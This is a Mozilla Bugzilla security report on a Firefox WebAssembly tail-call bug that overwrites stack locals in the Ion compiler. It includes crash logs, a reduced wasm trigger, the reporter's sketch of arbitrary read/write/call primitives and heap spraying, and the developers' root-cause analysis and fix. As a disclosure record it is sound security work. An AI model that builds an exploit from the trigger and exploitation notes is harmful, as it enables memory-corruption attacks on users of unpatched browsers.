# [WASM] Mismatch of assumed stack alignment of stack args with tail calls can overwrite locals in Ion

Bug URL: https://bugzilla.mozilla.org/show_bug.cgi?id=1862473
Component: JavaScript: WebAssembly
Bounty: (unknown)
Date: 2023-11-01T17:11:50Z
Keywords: csectype-bounds, reporter-external, sec-high
See Also:
- https://bugzilla.mozilla.org/show_bug.cgi?id=1866545

Created attachment 9361461
poc1101.js

User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36

Steps to reproduce:

The vulnerability exists in the WASM compiler of JS engine. The configuration for building is as follows:

ac_add_options --enable-project=js
ac_add_options --disable-optimize
ac_add_options --disable-unified-build
ac_add_options --disable-debug
ac_add_options --enable-debug-symbols
ac_add_options --disable-jemalloc
ac_add_options --disable-tests




Actual results:

This is the full crash log:
```
gdb-peda$ bt
#0  0x000018a9cbba41c0 in  ()
#1  0x000048840f012840 in  ()
#2  0x0000555558c3cb50 in  ()
#3  0x00007fffffff7360 in  ()
#4  0x000018a9cbba418f in  ()
#5  0x0000555558c3cb50 in  ()
#6  0x00005555575c60e5 in mozilla::detail::MaybeStorageBase<js::wasm::TrapData, true>::MaybeStorageBase() (this=0x5555575c60e5 <mozilla::detail::MaybeStorageBase<js::wasm::TrapData, true>::MaybeStorageBase()+21>) at obj-x86_64-pc-linux-gnu/dist/include/mozilla/MaybeStorageBase.h:78
#7  0x000018a9cbba46a9 in  ()
#8  0x0000555558c3cb50 in  ()
#9  0x0000555558bec588 in  ()
#10 0x00007fffffff7658 in  ()
#11 0x00007fffffff7658 in  ()
#12 0x00007fffffff7400 in  ()
#13 0x00005555575c3454 in js::jit::JitActivation::JitActivation(JSContext*)
    (this=0x7fffffff7400, cx=0x7fffffff7658)
    at js/src/vm/JitActivation.cpp:42
#14 0x0000555558314fab in js::wasm::Instance::callExport(JSContext*, unsigned int, JS::CallArgs, js::wasm::CoercionLevel)
    (this=0x555558c3cb50, cx=0x555558bec4a0, funcIndex=0x0, args=..., level=js::wasm::CoercionLevel::Spec) at js/src/wasm/WasmInstance.cpp:2851
#15 0x000055555836de24 in WasmCall(JSContext*, unsigned int, JS::Value*)
    (cx=0x555558bec4a0, argc=0x0, vp=0x555558d05670)
    at js/src/wasm/WasmJS.cpp:1808
#16 0x000055555713748c in CallJSNative(JSContext*, bool (*)(JSContext*, unsigned int, JS::Value*), js::CallReason, JS::CallArgs const&)
    (cx=0x555558bec4a0, native=0x55555836dd00 <WasmCall(JSContext*, unsigned int, JS::Value*)>, reason=js::CallReason::Call, args=...) at js/src/vm/Interpreter.cpp:472
#17 js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct, js::CallReason)
    (cx=0x555558bec4a0, args=..., construct=js::NO_CONSTRUCT, reason=js::CallReason::Call)
    at js/src/vm/Interpreter.cpp:566
#18 0x0000555557137b0a in InternalCall(JSContext*, js::AnyInvokeArgs const&, js::CallReason)
    (cx=0x555558bec4a0, args=..., reason=js::CallReason::Call)
    at js/src/vm/Interpreter.cpp:633
#19 0x0000555557137ad3 in js::CallFromStack(JSContext*, JS::CallArgs const&, js::CallReason)
    (cx=0x555558bec4a0, args=..., reason=js::CallReason::Call)
    at js/src/vm/Interpreter.cpp:638
#20 0x000055555714baa3 in js::Interpret(JSContext*, js::RunState&) (cx=0x555558bec4a0, state=...)
    at js/src/vm/Interpreter.cpp:3053
#21 0x000055555713676d in MaybeEnterInterpreterTrampoline(JSContext*, js::RunState&)
    (cx=0x555558bec4a0, state=...) at js/src/vm/Interpreter.cpp:386
#22 js::RunScript(JSContext*, js::RunState&) (cx=0x555558bec4a0, state=...)
    at js/src/vm/Interpreter.cpp:444
#23 0x0000555557138f3e in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JS::Handle<JSObject*>, js::AbstractFramePtr, JS::MutableHandle<JS::Value>)
    (cx=0x555558bec4a0, script=0x31f9a964060, envChainArg=(JSObject * const) 0x31f9a93e038 [object LexicalEnvironment], evalInFrame=AbstractFramePtr ((js::InterpreterFrame *) 0x0) = {...}, result=$JS::UndefinedValue()) at js/src/vm/Interpreter.cpp:831
#24 0x0000555557139152 in js::Execute(JSContext*, JS::Handle<JSScript*>, JS::Handle<JSObject*>, JS::MutableHandle<JS::Value>)
    (cx=0x555558bec4a0, script=0x31f9a964060, envChain=(JSObject * const) 0x31f9a93e038 [object LexicalEnvironment], rval=$JS::UndefinedValue()) at js/src/vm/Interpreter.cpp:863
#25 0x0000555557423d6f in ExecuteScript(JSContext*, JS::Handle<JSObject*>, JS::Handle<JSScript*>, JS::MutableHandle<JS::Value>)
    (cx=0x555558bec4a0, envChain=(JSObject * const) 0x31f9a93e038 [object LexicalEnvironment], script=0x31f9a964060, rval=$JS::UndefinedValue())
    at js/src/vm/CompilationAndEvaluation.cpp:494
#26 0x0000555557423e5f in JS_ExecuteScript(JSContext*, JS::Handle<JSScript*>)
    (cx=0x555558bec4a0, scriptArg=0x31f9a964060)
    at js/src/vm/CompilationAndEvaluation.cpp:518
#27 0x000055555701cb6b in RunFile(JSContext*, char const*, _IO_FILE*, CompileUtf8, bool, bool)
    (cx=0x555558bec4a0, filename=0x555558d01a10 "../AFL-WASM-v2/Workspace-SPM/test.js", file=0x555558d01bb0, compileMethod=CompileUtf8::DontInflate, compileOnly=0x0, fullParse=0x0)
    at js/src/shell/js.cpp:1217
#28 0x000055555701c4af in Process(JSContext*, char const*, bool, FileKind)
    (cx=0x555558bec4a0, filename=0x555558d01a10 "../AFL-WASM-v2/Workspace-SPM/test.js", forceTTY=0x0, kind=FileScript) at js/src/shell/js.cpp:1797
#29 0x0000555556ff975f in ProcessArgs(JSContext*, js::cli::OptionParser*)
    (cx=0x555558bec4a0, op=0x7fffffffdfa0) at js/src/shell/js.cpp:10871
#30 0x0000555556ff37b2 in Shell(JSContext*, js::cli::OptionParser*)
    (cx=0x555558bec4a0, op=0x7fffffffdfa0) at js/src/shell/js.cpp:11133
#31 0x0000555556feec17 in main(int, char**) (argc=0x3, argv=0x7fffffffe1b8)
    at js/src/shell/js.cpp:11537
#32 0x00007ffff7a48083 in __libc_start_main () at /lib/x86_64-linux-gnu/libc.so.6
#33 0x0000555556fc9d39 in _start ()
```
```
gdb-peda$ i registers
rax            0x555558cea5d0      0x555558cea5d0
rbx            0x48840f012840      0x48840f012840
rcx            0xd0574928          0xd0574928
rdx            0x3cd53d2c          0x3cd53d2c
rsi            0xc27f2164          0xc27f2164
rdi            0x5ebae657          0x5ebae657
rbp            0x7fffffff7360      0x7fffffff7360
rsp            0x7fffffff7330      0x7fffffff7330
r8             0xb3f6cad3          0xb3f6cad3
r9             0x9fac1b66          0x9fac1b66
r10            0x555558cea5d0      0x555558cea5d0
r11            0x7ffff7c10be0      0x7ffff7c10be0
r12            0x5555575c60e5      0x5555575c60e5
r13            0x7fffffffe1b0      0x7fffffffe1b0
r14            0x48840f012840      0x48840f012840
r15            0x7ffeedff0000      0x7ffeedff0000
rip            0x18a9cbba41c0      0x18a9cbba41c0
eflags         0x10202             [ IF RF ]
cs             0x33                0x33
ss             0x2b                0x2b
ds             0x0                 0x0
es             0x0                 0x0
fs             0x0                 0x0
gs             0x0                 0x0
gdb-peda$ x/20i  0x18a9cbba41c0-0x50
   0x18a9cbba4170: xchg   edi,eax
   0x18a9cbba4171: lods   al,BYTE PTR ds:[rsi]
   0x18a9cbba4172: mov    ecx,0xd0574928
   0x18a9cbba4177: mov    r8d,0xb3f6cad3
   0x18a9cbba417d: mov    r9d,0x9fac1b66
   0x18a9cbba4183: mov    rsi,QWORD PTR [rbp-0x8]
   0x18a9cbba4187: mov    rdx,rsi
   0x18a9cbba418a: call   0x18a9cbba4520
   0x18a9cbba418f: lea    rsp,[rbp-0x30]
   0x18a9cbba4193: mov    edi,0x5ebae657
   0x18a9cbba4198: mov    esi,0xc27f2164
   0x18a9cbba419d: mov    edx,0x3cd53d2c
   0x18a9cbba41a2: mov    r12,QWORD PTR [rbp-0x8]
   0x18a9cbba41a6: mov    rbx,QWORD PTR [r12+0x40]
   0x18a9cbba41ab: cmp    r14,rbx
   0x18a9cbba41ae: je     0x18a9cbba41f9
   0x18a9cbba41b4: mov    QWORD PTR [rsp+0x8],r14
   0x18a9cbba41b9: mov    r14,rbx
   0x18a9cbba41bc: mov    QWORD PTR [rsp],r14
=> 0x18a9cbba41c0: mov    r15,QWORD PTR [r14]
gdb-peda$
   0x18a9cbba41c3: mov    rax,QWORD PTR [r14+0x20]
   0x18a9cbba41c7: mov    rbx,QWORD PTR [r14+0x18]
   0x18a9cbba41cb: mov    QWORD PTR [rax+0xb0],rbx
   0x18a9cbba41d2: mov    rax,QWORD PTR [r12+0x38]
   0x18a9cbba41d7: call   rax
   0x18a9cbba41d9: or     r14,0x0
   0x18a9cbba41dd: mov    r14,QWORD PTR [rsp+0x8]
   0x18a9cbba41e2: mov    r15,QWORD PTR [r14]
   0x18a9cbba41e5: mov    r10,QWORD PTR [r14+0x20]
   0x18a9cbba41e9: mov    r12,QWORD PTR [r14+0x18]
   0x18a9cbba41ed: mov    QWORD PTR [r10+0xb0],r12
   0x18a9cbba41f4: jmp    0x18a9cbba4200
   0x18a9cbba41f9: mov    rax,QWORD PTR [r12+0x38]
   0x18a9cbba41fe: call   rax
   0x18a9cbba4200: lea    rsp,[rbp-0x30]
   0x18a9cbba4204: mov    eax,eax
   0x18a9cbba4206: mov    esi,0xc8f3826d
   0x18a9cbba420b: mov    edx,0x4fdc6d2c
   0x18a9cbba4210: mov    edi,eax
   0x18a9cbba4212: call   0x18a9cbba4030
```
The reason seems to be that the assembly code, compiled from the wasm module, caused a crash during its execution. The root cause is not clear now, but this OOB bug resulted in registers pollution and a direct overwrite of the call stack, making it exploitable.

For example, the critical part of this assembly block is r14 which is used as a pointer to access certain memory locations. If we can control the r14 register to an arbitrary value, there are several potential attacks we might be able to perform:

1. Arbitrary Read: From the instruction mov r15,QWORD PTR [r14], we can see that r14 is used as a pointer to read a value from memory. If we can control r14 to any arbitrary value, this potentially allows us to read data from any memory location in the process's address space.

2. Arbitrary Write: Similar to the previous point, the code contains the instruction mov QWORD PTR [rax+0xb0],rbx where rax is loaded from [r14+0x20]. If we can control r14 to point to a location of our choice, we can change the value of rax and thus control the destination of the write operation (i.e., rax+0xb0), leading to an arbitrary write vulnerability.

3. Arbitrary Function Call: The instruction call rax, where rax is loaded from [r12+0x38], implies that an arbitrary function pointed to by rax can be called. If we control r14 to a controlled memory location where we have written a crafted r12 structure, we can induce the program to call an arbitrary function, potentially leading to code execution.

This issue can be reproduced on the gecko-dev at the GIT commit 11d085b63cf74b using the --wasm-tail-calls running flag. It's worth noting that this flag is enabled by default in the Nightly version of Firefox(121.0a1 2023-11-01).

---

**Comment 1 — rhunt@eqrion.net — 2023-11-06T02:59:16Z**

Yury, this sounds like it may be tail call related. Can you take a look?

Regarding r14, that is a pinned wasm instance register. So it theoretically could be corrupted to something user controlled, but that's difficult.

---

**Comment 2 — ydelendik@mozilla.com — 2023-11-06T17:42:12Z**

Reduced test case:

```
(module
var wasm_code = wasmTextToBinary(`(module
  (func $func1)
  (func $func2 (param i32 arrayref arrayref i32 i32 i32 i32)
    return_call $func1
  )
  (func (export "main") 
    i32.const 1
    ref.null array
    ref.null array
    i32.const -2
    i32.const -3
    i32.const -4
    i32.const -5
    call $func2

    ref.null array
    ref.cast (ref array)
    drop
  )
)`);


var wasm_module = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var f = wasm_instance.exports.main;
f()
```

---

**Comment 3 — ydelendik@mozilla.com — 2023-11-06T20:37:19Z**

The failure is reproducible on Ion and x86_64 platforms.

The reason is during tail calls, the SP pointer is moved with alignment of `WasmStackAlignment`. The Ion is trying to pack locals and parameters, and during a tail call (especially that "gives" stack back, see $func2 has more parameters than $func1), the SP was moved too far and locals/temps were overwritten. In the test above, temp for `ref.null` was replaced.

The solution is to align locals/temps on the boundary of `WasmStackAlignment` at https://searchfox.org/mozilla-central/source/js/src/jit/shared/CodeGenerator-shared.cpp#82 (as we do for Aarch64). We already do the same thing in the baseline https://searchfox.org/mozilla-central/source/js/src/wasm/WasmStubs.cpp#718.

---

**Comment 4 — ydelendik@mozilla.com — 2023-11-06T22:13:06Z**

Created attachment 9362243
Bug 1862473 - Align local slots for wasm tail calls. r?rhunt

---

**Comment 5 — cz18811105578@gmail.com — 2023-11-07T07:01:16Z**

(In reply to Ryan Hunt [:rhunt] from comment #1)
> Yury, this sounds like it may be tail call related. Can you take a look?
> 
> Regarding r14, that is a pinned wasm instance register. So it theoretically could be corrupted to something user controlled, but that's difficult.

Yes, it's difficult, but not impossible. And another way is to manipulate the memory pointed to by r14(0x48840f012840) in this poc, we can employ heap spray technique to construct fake objects during large memory pages allocation within the 0x488* range (in engine or browser). However, it is important to note that this exploit might need to be customized for a specific binary, as the pointer originates from a specific location within the text segment.

---

**Comment 6 — rhunt@eqrion.net — 2023-11-07T22:00:37Z**

Tail calls is only enabled in Nightly. We have a disabled version in Beta that is unaffected.

---

**Comment 7 — release-mgmt-account-bot@mozilla.tld — 2023-11-08T12:15:38Z**

The bug has a release status flag that shows some version of Firefox is affected, thus it will be considered confirmed.

---

**Comment 8 — pulsebot@bmo.tld — 2023-11-08T16:59:59Z**

Pushed by ydelendik@mozilla.com:
https://hg.mozilla.org/integration/autoland/rev/b47bf0a3b904
Align local slots for wasm tail calls. r=rhunt

---

**Comment 9 — aryx.bugmail@gmx-topmail.de — 2023-11-08T21:23:44Z**

https://hg.mozilla.org/mozilla-central/rev/b47bf0a3b904

---

**Comment 10 — cz18811105578@gmail.com — 2023-11-14T20:23:55Z**

Credit info(if any): P1umer and Q1IQ. Thanks!

---

**Comment 11 — cz18811105578@gmail.com — 2024-03-18T23:04:20Z**

Hello, could this bug be eligible for a CVE number?

---

**Comment 12 — rhunt@eqrion.net — 2024-03-19T13:58:49Z**

Forwarding the question. I think you can also reach out to security@mozilla.com for questions like this too.

---

**Comment 13 — dveditz@mozilla.com — 2024-03-21T06:09:50Z**

the mailing address is best for that kind of question, but our policy has been that CVEs are not needed to coordinate fixes for vulnerabilities that did not affect the Release population.

---

**Comment 14 — dveditz@mozilla.com — 2024-04-29T06:35:50Z**

Bulk-unhiding security bugs fixed in Firefox 119-121 (Fall 2023). Use "moo-doctrine-subsidy" to filter
